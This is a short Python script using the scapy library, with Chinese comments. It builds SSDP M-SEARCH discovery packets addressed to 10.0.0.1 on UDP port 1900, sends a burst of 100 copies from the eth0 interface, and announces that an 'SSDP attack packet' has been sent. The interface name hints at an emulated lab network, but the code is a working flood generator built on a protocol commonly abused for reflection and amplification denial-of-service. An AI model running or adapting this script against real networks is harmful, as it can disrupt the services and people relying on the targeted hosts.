from scapy.all import *

# 定义目标IP地址和端口号
target_ip = "10.0.0.1"
target_port = 1900
def get_if():
    ifs = get_if_list()
    iface = None  # "h1-eth0"
    for i in get_if_list():
        if "eth0" in i:
            iface = i
            break;
    if not iface:
        print("Cannot find eth0 interface")
        exit(1)
    return iface
# 构造HTTP GET请求
iface = get_if()
pkt = Ether(src=get_if_hwaddr(iface), dst='ff:ff:ff:ff:ff:ff')
# 构造SSDP请求包
packet = pkt/IP(dst=target_ip)/UDP(dport=target_port)/Raw(load='M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:ssdp:all\r\nMan:"ssdp:discover script "\r\nMX:2\r\n\r\n')

# 发送SSDP请求包
import time
for i in range(1):
    sendp(packet * 100, iface=iface, verbose=False)
    time.sleep(1)
print("SSDP攻击包已发送至目标IP地址：", target_ip)
